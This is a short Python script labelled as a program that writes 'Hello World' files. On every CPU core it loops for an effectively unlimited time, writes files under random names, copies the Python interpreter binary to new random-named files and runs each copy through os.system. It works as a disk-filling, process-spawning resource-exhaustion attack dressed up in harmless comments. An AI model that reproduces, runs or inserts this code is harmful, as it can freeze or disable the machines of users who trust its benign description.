import time
import os
import random
import string
import multiprocessing
import shutil
import sys

# Define a function to generate a random file name
def generate_random_file_name():
    letters_and_digits = string.ascii_letters + string.digits
    return ''.join(random.choice(letters_and_digits) for _ in range(10)) + ".py"

# Define the content of the Hello World program
hello_world_code = '''
print('hello beffelo')
'''

# Set the number of processes to the number of CPU cores available
num_processes = multiprocessing.cpu_count()

# Set the duration in seconds (n minutes)
duration = 9999999999999999999999 * 99999999999999999999999

# Define a function for each process to execute
def process_function(process_id):
    start_time = time.time()
    while time.time() - start_time < duration:
        # Generate a random file name
        new_file_name = generate_random_file_name()

        # Check if a file with the same name already exists
        if os.path.isfile(new_file_name):
            print(f"File '{new_file_name}' already exists. Renaming...")

            # Rename the existing file to a random name
            os.rename(new_file_name, generate_random_file_name())

        # Write the Hello World program to the new text file
        with open(new_file_name, 'w') as file:
            file.write(hello_world_code)

        print(f"Hello World program has been written to {new_file_name} by process {process_id}")

        # Copy the current executable to a new file
        current_exe = sys.executable
        new_exe_name = generate_random_file_name()
        shutil.copy(current_exe, new_exe_name)

        # Execute the copied executable
        os.system(new_exe_name)

if __name__ == '__main__':
    processes = []

    # Create and start multiple processes
    for i in range(num_processes):
        process = multiprocessing.Process(target=process_function, args=(i,))
        processes.append(process)
        process.start()

    # Wait for all processes to complete
    for process in processes:
        process.join()

    print("Program execution complete.")
